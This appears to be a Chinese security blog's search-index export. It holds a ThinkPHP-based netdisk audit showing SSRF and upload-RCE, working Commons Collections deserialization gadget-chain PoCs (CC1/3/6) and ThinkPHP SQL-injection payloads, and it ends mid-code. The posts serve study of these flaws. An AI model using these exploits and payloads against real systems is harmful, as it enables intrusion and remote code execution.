[{"categories":["PHP"],"content":"ThinkPHP5.0完全开发手册 ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:0:0","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习 某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["PHP"],"content":" 某盘代码审计学习完开发手册，先来套源码试试手。 想要快速入手代码审计，就要先看手册了解一些底层架构等等 从index.php开始 和原来的相比改动不大，应用目录是application，直接进行查看 先看config.php，看一些配置信息能够帮助我们快速了解此套源码 全局过滤方法 访问模式，最最最重要的是我们的控制器 可以看到，它开启了路由但是并没有打开强制路由 这里看一下路由，并没有什么东西 想要得到未授权RCE，还是得先看Index模块下面的控制器，因为可能有未授权访问，像这种 MVC 架构admin模块下，未授权太少了Orz 除了Api、Login控制器，其他控制器均继承了Base控制器 那他们为什么要都继承Base呢？进入看一下 Orz在构造函数下面做了权限验证，扫了一眼除非知道数据库里的$header_uid不然无法绕过 但是，我们上面还提到了一个api控制器，没有继承。进入查看一下 ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:1:0","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习 某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["PHP"],"content":" 0x01 SSRF在curlfun()函数下面，看到了一个很明显的SSRF public function curlfun($url, $params = array(), $method = 'GET') { $header = array(); $opts = array(CURLOPT_TIMEOUT =\u003e 10, CURLOPT_RETURNTRANSFER =\u003e 1, CURLOPT_SSL_VERIFYPEER =\u003e false, CURLOPT_SSL_VERIFYHOST =\u003e false, CURLOPT_HTTPHEADER =\u003e $header); /* 根据请求类型设置特定参数 */ switch (strtoupper($method)) { case 'GET' : $opts[CURLOPT_URL] = $url . '?' . http_build_query($params); $opts[CURLOPT_URL] = substr($opts[CURLOPT_URL],0,-1); break; case 'POST' : //判断是否传输文件 $params = http_build_query($params); $opts[CURLOPT_URL] = $url; $opts[CURLOPT_POST] = 1; $opts[CURLOPT_POSTFIELDS] = $params; break; default : } /* 初始化并执行curl请求 */ $ch = curl_init(); curl_setopt_array($ch, $opts); $data = curl_exec($ch); $error = curl_error($ch); curl_close($ch); if($error){ $data = null; } return $data; } 先本地起一个服务 构造一个poc试试， /index.php/index/api/curlfun?url=http://localhost:9080/ssrf.txt ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:1:1","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习 某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["PHP"],"content":" 0x02 SSRFapi控制器下，还存在一个post_url方法，也存在SSRF public function post_curl($url,$data){ $ch = curl_init($url); curl_setopt($ch, CURLOPT_CUSTOMREQUEST, \"POST\"); curl_setopt($ch, CURLOPT_POSTFIELDS,$data); curl_setopt($ch, CURLOPT_RETURNTRANSFER,true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); $result = curl_exec($ch); if (curl_errno($ch)) { print curl_error($ch); } curl_close($ch); return $result; } ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:1:2","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习 某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["PHP"],"content":" 0x03 后台 RCE在admin模块setup控制器editconf方法处，存在文件上传漏洞 public function editconf() { // echo \"test\"; // if($this-\u003eotype != 3){ // echo '死你全家!';exit; // } if(input('post.')){ $data = input('post.'); foreach ($data as $k =\u003e $v) { $arr = explode('_',$k); $_data['id'] = $arr[1]; $_data['value'] = $v; $file = request()-\u003efile('pic_'.$_data['id']); if($file){ $info = $file-\u003emove(ROOT_PATH . 'public' . DS . 'uploads'); if($info){ $_data['value'] = '/public' . DS . 'uploads/'.$info-\u003egetSaveName(); } } if($_data['value'] == '' \u0026\u0026 isset($arr[2]) \u0026\u0026 $arr[2] == 3){ continue; } Db::name('config')-\u003eupdate($_data); } cache('conf',null); $this-\u003esuccess('编辑成功'); } } 可以看到直接input接受参数，并且利用了request()-\u003efile来上传文件 而在thinkphp中的file函数，是没有安全设置的 所以可以直接进行上传， 构造poc 在public目录下面，成功进行了上传 但是文件名字看起来是一串随机的字符串组成的，这怎么办呢？我们根进去查看一下是怎么生成的，跟进move函数 看到了buildSavename函数正是文件保存命名规则， 跟进去查看一下，命名规则是date日期 前面的date函数是 uploads 下面的目录，而后面的md5(microtime(true))正是生成的那一串看似随机的字符串，爆破一下即可出文件名 那针对microtime(true)这样的该如何爆破呢？ 在ctfshow 元旦水友赛中出过这样一道题 https://docs.qq.com/doc/DRlBMcWdhZW9ZUnFB 里面有爆破脚本 在System控制器下，同样存在类似的功能点 ","date":"2024-01-17","objectID":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/:1:3","tags":["ThinkPHP"],"title":"ThinkPHP5.0学习 某盘审计","uri":"/thinkphp5.0%E5%AD%A6%E4%B9%A0-%E6%9F%90%E7%9B%98%E5%AE%A1%E8%AE%A1/"},{"categories":["Java"],"content":" CommonsCollections3详解通过类动态加载可以得知defineClass可以执行任意代码 全局搜索一下哪里调用了defineClass, TemplatesImpl类里调用了，再全局搜索一下哪里调用了这里的defineClass类 在defineTransletClasses方法这里进行了调用 再搜索一下哪里调用了defineTransletClasses 在getTransletInstance()方法调用了defineTransletClasses()方法并且，还执行了newInstance()进行了初始化操作，可以将注入的类执行 编写这部分的poc package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class CommonsCollections3 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); templatesImpl.newTransformer(); } } Test.java import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { { try { Runtime.getRuntime().exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); } catch (IOException e) { throw new RuntimeException(e); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 通过上面的例子，我们只需要调用到newTransformer()方法即可，回想 CC1链是有任意类任意方法调用的，所以直接把 CC1 复制过来 package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class CommonsCollections3 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(templatesImpl), new InvokerTransformer(\"newTransformer\",null,null) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap); //serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-16","objectID":"/commonscollections3%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["CommonsCollections"],"title":"CommonsCollections3链详解","uri":"/commonscollections3%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" 另一条上面的例子可以得知是InvokerTransformer类的transformer调用了TemplateImpl类的newTransformer()方法才得以执行的，这里再找一个其他类调用newTransformer()方法 在TrxAXFilter类的构造器中调用了newTransformer()方法，但是TrxAXFilter类无法被序列化，所以找一个可以被序列化的类来调用TrxAXFilter类的构造器，这里选择了InstantiateTransformer类中的transformer()方法，来调用上面的构造器从而调用到newTransformer()方法 构造poc package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class CommonsCollections3 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl}); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap); //serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-16","objectID":"/commonscollections3%E9%93%BE%E8%AF%A6%E8%A7%A3/:2:0","tags":["CommonsCollections"],"title":"CommonsCollections3链详解","uri":"/commonscollections3%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" 类加载与反序列化类加载的时候会执行代码 初始化：静态代码快 实例化：构造代码快、无参构造函数 ","date":"2024-01-16","objectID":"/java-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/:1:0","tags":["CommonsCollections"],"title":"Java 动态类加载","uri":"/java-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/"},{"categories":["Java"],"content":" 动态类加载方法Class.forname 初始化/不初始化 ClassLoader.loadClass不进行初始化 底层的原理，实现加载任意的类 URLClassLoader任意类加载：file/http/jar URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\"http://localhost:9080/\")}); Class\u003c?\u003e c = urlClassLoader.loadClass(\"Test\"); c.newInstance(); ClassLoader.defineClass字节码加载任意类 私有 ClassLoader cl = ClassLoader.getSystemClassLoader(); Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); Class c= (Class) defineClassMethod.invoke(cl,\"Test\",code,0,code.length); c.newInstance(); Unsafe.defineClass字节码加载 public类不能直接生成 Spring 里面可以直接生成 ClassLoader cl = ClassLoader.getSystemClassLoader(); Class c = Unsafe.class; Field theUnsafeField = c.getDeclaredField(\"theUnsafe\"); theUnsafeField.setAccessible(true); Unsafe unsafe = (Unsafe) theUnsafeField.get(null); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); Class c2 = unsafe.defineClass(\"Test\",code,0,code.length,cl,null); c2.newInstance(); ","date":"2024-01-16","objectID":"/java-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/:2:0","tags":["CommonsCollections"],"title":"Java 动态类加载","uri":"/java-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/"},{"categories":["PHP"],"content":" ThinkPHP 5基础以ThinkPHP5.1.x版本为例 composer create-project topthink/think=5.1.36 thinkphp5.1.36 ThinkPHP5.1完全开发手册 先来了解目录架构，这里直接看手册 https://www.kancloud.cn/manual/thinkphp5_1/353950 ","date":"2024-01-15","objectID":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:1:0","tags":["ThinkPHP"],"title":"ThinkPHP5漏洞学习","uri":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 访问模式5.1的 URL 访问受路由决定，如果在没有定义或匹配路由的情况下(并且没有开启强制路由)，则基于 /index.php（或者其它入口文件）/模块/控制器/操作/参数/值… ","date":"2024-01-15","objectID":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:1:1","tags":["ThinkPHP"],"title":"ThinkPHP5漏洞学习","uri":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 请求参数继承了控制器基类think\\Controller直接使用this-\u003erequest-\u003eparam('name');来获取请求参数 Facade调用Request::param('name'); 助手函数request()-\u003eparam('name'); ","date":"2024-01-15","objectID":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:1:2","tags":["ThinkPHP"],"title":"ThinkPHP5漏洞学习","uri":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 漏洞详解parseWhereItem未过滤处理where查询表达式 漏洞 Demo public function sqlDemo(){ $username = request()-\u003eget('username'); $result1 = db('user')-\u003ewhere('username','exp',$username)-\u003eselect(); } Poc ) union select 1,2,updatexml(1,concat(1,user(),1),1)--+ debug断点调试，跟进where()方法 这里跟进parseWhereExp()方法， 利用whereExp来处理传入的$username，继续跟进whereExp()方法 进行了赋值之后，直接返回， 便进入到select()方法里面，和ThinkPHP3 SQL 注入有类似之处，这里直接进入parseWhere()方法里面进行了返回 然后进行了一系列操作之后，就直接执行了。 ","date":"2024-01-15","objectID":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:0","tags":["ThinkPHP"],"title":"ThinkPHP5漏洞学习","uri":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["Java"],"content":"世界上最好用的 CC 链 ","date":"2024-01-15","objectID":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/:0:0","tags":["CommonsCollections"],"title":"CommonsCollections6链详解","uri":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" CommonsCollections6 详解CommonsCollections1 的链子调用了LazyMap类中的transform()方法，于是找一个任意类调用get()方法的地方，这里换到了TideMapEntry类 这里的hashCode()方法里调用了getValue()方法里面调用了get()方法，并且map可控，这里的hashCode()很熟悉，因为在URLDNS链中HashMap类里的readObject()方法调用到了hashCode()方法 于是构造poc package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections6 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e lazymap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, \"test\"); HashMap\u003cObject, Object\u003e map2 = new HashMap\u003c\u003e(); map2.put(tiedMapEntry,\"test1\"); lazymap.remove(\"test\"); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(lazymap,chainedTransformer); //serialize(map2); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-15","objectID":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["CommonsCollections"],"title":"CommonsCollections6链详解","uri":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":null,"content":"N1Rvana's introduction","date":"2024-01-15","objectID":"/about/","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":" About MeSU Team of member 某不知名三本院校大一在读 ","date":"2024-01-15","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":" My CVEs CVE-ID Porject CVE-2022-2886 Laravel CVE-2022-2870 Laravel CVE-2022-33107 ThinkPHP ","date":"2024-01-15","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"N1Rvana's friends","date":"2024-01-15","objectID":"/friends/","tags":null,"title":"Index","uri":"/friends/"},{"categories":null,"content":" Base info - nickname: N1rvana avatar: https://nlrvana.github.io/avatar.png url: https://nlrvana.github.io/ 交换友链，请按上述格式发送至beichenghua@gmail.com ","date":"2024-01-15","objectID":"/friends/:1:0","tags":null,"title":"Index","uri":"/friends/"},{"categories":["PHP"],"content":"ThinkPHP 漏洞学习 环境搭建ThinkPHP3 composer create-project topthink/thinkphp=版本号 文件名 ThinkPHP5(完整版) composer create-project topthink/think=版本号 文件名 阿里云 Compose 全量镜像资源库 composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ https://www.runoob.com/w3cnote/composer-install-and-usage.html https://packagist.org/ 框架了解审计之前，我们需要了解框架的信息 ThinkPHP3.2.3完全开发手册 composer create-project topthink/thinkphp=3.2.3 thinkphp3.2.3 index.php 入口文件 Application 应用目录 Public 资源文件目录 ThinkPHP 框架目录 其中框架目录ThinkPHP的结构如下 Common 核心公共函数目录 Conf 核心配置目录 Lang 核心语言包目录 Library 核心类库目录 Think 核心Think类库目录 Behavior 行为类库目录 Org Org类库目录 Vendor 第三方类库目录 ... 更多类库目录 Mode 框架应用模式目录 Tpl 系统模板目录 ThinkPHP.php 框架入口文件 其中Application目录如下 Common 应用公共模块 Common 应用公共函数目录 Conf 应用公共配置文件目录 Home 默认生成的Home模块 Conf 模块配置文件目录 Common 模块函数公共目录 Controller 模块控制器目录 Model 模块模型目录 View 模块视图文件目录 Runtime 运行时目录 Cache 模板缓存目录 Data 数据目录 Logs 日志目录 Temp 缓存目录 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:0:0","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 路由信息thinkphp3使用 URL 模式切换：普通 GET 模式、pathinfo、rewrite 和兼容模式 /ThinkPHP/Conf/convention.php return array( \"URL_MODEL\" =\u003e 1 //URL模式:0(普通模式) 1(PATHINFO 模式) 2(REWRITE模式) 3(兼容模式) //静态路由 \"URL_ROUTE_ON\" =\u003e fasle, \"URL_ROUTE_RULES\" =\u003e array() ) 历史漏洞","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:1:0","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" SQL 注入","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:0","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 0x01 聚合查询功能count方法未过滤调用parseKey 利用条件ThinkPHP[5.0.0,5.0.23]，ThinkPHP 3 全版本 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:1","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 漏洞分析和原理ThinkPHP3.2.3 漏洞 demo public function SqlDemo(){ $field = I('get.field'); $num = M('user')-\u003ecount($field); //M('user') 相当于 new Think\\Model('user') var_dump($num); } poc ?field=id),updatexml(1,concat(1,user(),1),1)from+user%23 在这里打个断点，跟进 会进入到ThinkPHP/Library/Think/Model.class.php中的__call方法中， 因为是count，所以进入到$this-\u003egetField()方法 经过对传入字段进行解析等一系列操作之后， 进入到$this-\u003edb-\u003eselect()方法中 此时传入的$options变成了 继续跟进，这里进入到了$this-\u003ebuildSelectSql()方法，来构建 select 语句 进入到$this-\u003eparseSql()方法中 利用$this-\u003eparseField()方法进行解析，继续跟进 这里的$this-\u003eparseKey()对传入的 payload 并没有进行过滤 然后便回到$this-\u003eparseField()方法中，返回构建的 field 语句 最终回到$this-\u003eparseSql()方法中，返回最终需要执行的 sql 语句 最后得到了执行 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:2","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 0x02 _parseOptions未过滤$options导致 sql 注入 利用条件ThinkPHP \u003c= 3.2.3 漏洞原理和分析$options查询条件可以不经过数据处理直接进入_parseOptions，再进入Driver.class.php的sql操作函数，和上面一样通过buildSelectsql方法或直接调用delete方法进行拼接 sql 语句，然后再进行执行 漏洞 Demo public function SqlDemo() { $id = I('id'); $res = M('user')-\u003eselect($id); $res = M('user')-\u003efind($id); } poc id[comment]=\\*/where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)/\\* id[limit]=1,1+procdure+analyse(updatexml(1,concat(0x7e,user(),0x7e),1),1)-- id[field]=* from user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1) --+ 具体构造出多少个poc，可以看pasexxx有多少个 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:3","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["Java"],"content":"比较难一点的CC链 CommonsCollections1链详解jdk8源码下载 https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 漏洞触发点在org.apache.commons.collections.functors.InvokerTransformer 其中的transform()方法 很明显的一个反射调用，其中iMethodName、iParamTypes、iArgs都是可控的变量，便可以调用任意方法和任意参数 看一下构造器是如何赋值的 构造一个简单的 payload 试试 new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}).transform(Runtime.getRuntime()); 找一个任意类调用transforms()方法的方法，这里选择org.apache.commons.collections.map.TransformedMap类的checkSetValue()方法 valueTransformer变量可控 但是因为构造器是protected修饰，所以无法直接调用，利用这里的静态方法decorate()进行了调用 再查看一下哪里调用了checkSetValue()方法，只有这一处 setValue()方法调用了checkSetValue()，构造一个payload，看看能不能通 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformedMap.entrySet()){ entry.setValue(r); 接着找一个setValue()方法的调用，在sun.reflect.annotation.AnnotationInvocationHandler类中，找到了如下方法 这里调用了setValue()方法，并且还在readObject()方法中，继续构造poc Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject,Object\u003e map = new 